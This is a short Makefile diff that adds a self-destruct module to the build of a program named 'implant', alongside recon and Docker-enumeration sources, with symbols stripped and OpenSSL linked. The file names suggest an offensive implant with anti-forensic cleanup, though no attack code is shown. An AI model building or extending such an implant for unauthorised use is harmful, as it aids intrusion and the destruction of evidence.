@@ -7,11 +7,11 @@ CXXFLAGS = -O2 -s \
 LDFLAGS = -lssl -lcrypto
 
 TARGET = implant
-SRC = implant.cpp recon.cpp docker_enum.cpp
+SRC = implant.cpp recon.cpp docker_enum.cpp self_destruct.cpp
 
 all: $(TARGET)
 
-$(TARGET): $(SRC) recon.h docker_enum.h
+$(TARGET): $(SRC) recon.h docker_enum.h self_destruct.h
 	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRC) $(LDFLAGS)
 
 clean:
